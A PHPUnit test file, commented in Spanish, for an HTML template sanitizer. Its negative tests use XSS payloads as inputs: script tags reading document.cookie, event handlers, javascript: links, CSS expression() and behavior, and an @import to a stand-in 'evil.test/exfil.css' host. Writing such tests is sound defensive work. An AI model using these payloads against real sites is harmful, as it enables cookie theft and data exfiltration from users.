<?php

namespace Tests\Unit\Services;

use App\Services\Templates\AdvancedTemplateSanitizer;
use Tests\TestCase;

/**
 * Cobertura de las reglas NO NEGOCIABLES del modo avanzado (auditoría
 * 2026-08-01): script, atributos on-*, url(), @import, expression() y
 * behavior SIEMPRE bloqueados, sin importar la presión de tiempo bajo la
 * que se implementó esta clase. Ver también el docblock de la clase.
 */
class AdvancedTemplateSanitizerTest extends TestCase
{
    private AdvancedTemplateSanitizer $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->sanitizer = new AdvancedTemplateSanitizer();
    }

    // ── Negativos: lo que NUNCA debe sobrevivir ─────────────────────────

    public function test_strips_script_tags_and_their_content(): void
    {
        $result = $this->sanitizer->sanitize('<div>Hola</div><script>alert(document.cookie)</script>');

        $this->assertStringNotContainsString('<script', $result);
        $this->assertStringNotContainsString('alert', $result);
        $this->assertStringContainsString('Hola', $result);
    }

    public function test_strips_inline_event_handlers(): void
    {
        $result = $this->sanitizer->sanitize('<div onclick="alert(1)" onmouseover="steal()">Hola</div>');

        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('onmouseover', $result);
        $this->assertStringContainsString('Hola', $result);
    }

    public function test_strips_at_import_from_style_block(): void
    {
        $result = $this->sanitizer->sanitize('<style>@import url("https://evil.test/exfil.css");</style><div>x</div>');

        $this->assertStringNotContainsString('@import', $result);
        $this->assertStringNotContainsString('evil.test', $result);
    }

    public function test_strips_expression_from_a_css_value(): void
    {
        $result = $this->sanitizer->sanitize('<style>.x { width: expression(alert(1)); }</style><div class="x">y</div>');

        $this->assertStringNotContainsString('expression', $result);
        $this->assertStringNotContainsString('alert', $result);
    }

    public function test_strips_behavior_property(): void
    {
        $result = $this->sanitizer->sanitize('<style>.x { behavior: url(evil.htc); }</style><div class="x">y</div>');

        $this->assertStringNotContainsString('behavior', $result);
        $this->assertStringNotContainsString('evil.htc', $result);
    }

    public function test_strips_url_from_background_image_and_from_shorthand(): void
    {
        // background-image/background (shorthand) y list-style-image no
        // están en el allowlist a propósito — url() nunca puede colarse por
        // ninguna propiedad CSS, ni siquiera apuntando a un host permitido.
        $result = $this->sanitizer->sanitize(
            '<style>.x { background-image: url(https://example.test/x.png); background: url(https://example.test/y.png) red; }</style>'
            . '<ul><li class="x">y</li></ul>'
        );

        $this->assertStringNotContainsString('url(', $result);
        $this->assertStringNotContainsString('background-image', $result);
    }

    public function test_strips_javascript_scheme_from_href_and_img_src(): void
    {
        $result = $this->sanitizer->sanitize(
            '<a href="javascript:alert(1)">click</a><img src="javascript:alert(1)" alt="x">'
        );

        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_strips_data_scheme_from_img_src(): void
    {
        $result = $this->sanitizer->sanitize('<img src="data:image/png;base64,AAAA" alt="x">');

        $this->assertStringNotContainsString('data:image', $result);
    }

    public function test_never_enables_position_or_z_index_even_though_broad_css_is_allowed(): void
    {
        $result = $this->sanitizer->sanitize(
            '<style>.x { position: absolute; top: 0; left: 0; z-index: 9999; }</style><div class="x">y</div>'
        );

        $this->assertStringNotContainsString('position', $result);
        $this->assertStringNotContainsString('z-index', $result);
    }

    public function test_strips_iframe_and_object_tags(): void
    {
        $result = $this->sanitizer->sanitize('<iframe src="https://evil.test"></iframe><object data="x"></object><p>Ok</p>');

        $this->assertStringNotContainsString('<iframe', $result);
        $this->assertStringNotContainsString('<object', $result);
        $this->assertStringContainsString('Ok', $result);
    }

    // ── Positivos: lo que SÍ debe sobrevivir (es "modo avanzado", no el shell fijo) ──

    public function test_keeps_a_full_document_skeleton_with_style_block(): void
    {
        $result = $this->sanitizer->sanitize(
            '<html><head><title>x</title><style>.card{color:#1e5fa8;border:1px solid #ccc;border-radius:8px;}</style></head>'
            . '<body><div class="card"><h1>Factura</h1><p>Detalle</p></div></body></html>'
        );

        $this->assertStringContainsString('<style>', $result);
        $this->assertStringContainsStringIgnoringCase('color:#1e5fa8', $result);
        $this->assertStringContainsString('border-radius:8px', $result);
        $this->assertStringContainsString('<h1>Factura</h1>', $result);
        $this->assertStringContainsString('<p>Detalle</p>', $result);
        // El wrapper del tenant se descarta y se reconstruye con el propio;
        // el <title> (no soportado) no debe sobrevivir en ningún lado.
        $this->assertStringNotContainsString('<title>', $result);
        $this->assertStringStartsWith('<!DOCTYPE html><html><head><meta charset="UTF-8">', $result);
    }

    public function test_keeps_a_table_with_colspan_and_broad_css(): void
    {
        $result = $this->sanitizer->sanitize(
            '<table><tr><td colspan="2" style="text-align:right;font-weight:bold;">Total</td></tr></table>'
        );

        $this->assertStringContainsString('<table>', $result);
        $this->assertStringContainsString('colspan="2"', $result);
        $this->assertStringContainsString('text-align:right', $result);
        $this->assertStringContainsString('font-weight:bold', $result);
    }

    public function test_keeps_an_image_with_an_allowed_scheme(): void
    {
        $result = $this->sanitizer->sanitize('<img src="https://example.test/logo.png" alt="Logo" width="120" height="40">');

        $this->assertStringContainsString('src="https://example.test/logo.png"', $result);
        $this->assertStringContainsString('alt="Logo"', $result);
        $this->assertStringContainsString('width="120"', $result);
    }

    public function test_keeps_a_link_with_an_allowed_scheme(): void
    {
        $result = $this->sanitizer->sanitize('<a href="https://example.test">Ver más</a>');

        $this->assertStringContainsString('href="https://example.test"', $result);
        $this->assertStringContainsString('Ver más', $result);
    }

    public function test_keeps_placeholder_tokens_intact_as_plain_text(): void
    {
        // El sanitizer no sabe qué es un placeholder — {{...}} es texto
        // plano para HTMLPurifier, debe sobrevivir intacto para que
        // PlaceholderResolver/BlockMarkerInjector lo procesen después.
        $result = $this->sanitizer->sanitize(
            '<body><p>Hola {{cliente.nombre}}</p><div>{{factura.tabla_items}}</div></body>'
        );

        $this->assertStringContainsString('{{cliente.nombre}}', $result);
        $this->assertStringContainsString('{{factura.tabla_items}}', $result);
    }

    public function test_empty_input_produces_a_minimal_valid_document(): void
    {
        $result = $this->sanitizer->sanitize('');

        $this->assertStringContainsString('<html>', $result);
        $this->assertStringContainsString('<body>', $result);
    }
}
